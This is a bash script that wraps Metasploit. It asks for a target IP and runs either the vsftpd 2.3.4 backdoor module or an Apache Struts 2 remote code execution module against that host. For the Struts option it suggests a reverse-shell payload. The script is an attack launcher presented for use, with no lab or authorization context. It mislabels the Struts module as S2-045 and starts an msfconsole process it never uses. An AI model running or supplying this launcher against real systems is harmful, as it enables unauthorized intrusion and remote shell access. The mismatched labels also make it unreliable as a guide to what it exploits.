#!/bin/bash

# Metasploit Exploit Script

# Run msfconsole
msfconsole -q &

# Wait for msfconsole to start
sleep 5

# Prompt the user for the target's IP address
read -p "Enter the target's IP address: " target_ip

# Prompt the user to choose an exploit
echo "Choose a Metasploit exploit to execute:"
echo "1. vsftpd 2.3.4 Backdoor Command Execution"
echo "2. Apache Struts 2 Remote Code Execution (S2-045)"
read -p "Enter the number of the exploit: " exploit_choice

# Use case statement to execute the chosen exploit
case $exploit_choice in
    1)
        # vsftpd 2.3.4 Backdoor Command Execution
        echo "Executing vsftpd 2.3.4 Backdoor Command Execution..."
        msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $target_ip; show options; run; exit"
        ;;
    2)
        # Apache Struts 2 Remote Code Execution (S2-045)
        echo "Executing Apache Struts 2 Remote Code Execution (S2-045)..."

        # Display payload options
        echo "Payload options:"
        msfconsole -q -x "use exploit/multi/http/struts2_rest_xstream; show payloads; exit"

        # Prompt user for payload
        read -p "Enter the payload (e.g., cmd/unix/reverse_python): " selected_payload

        msfconsole -q -x "use exploit/multi/http/struts2_rest_xstream; set RHOSTS $target_ip; set PAYLOAD $selected_payload; show options; run; exit"
        ;;
    *)
        # Invalid choice
        echo "Invalid choice. Exiting."
        ;;
esac

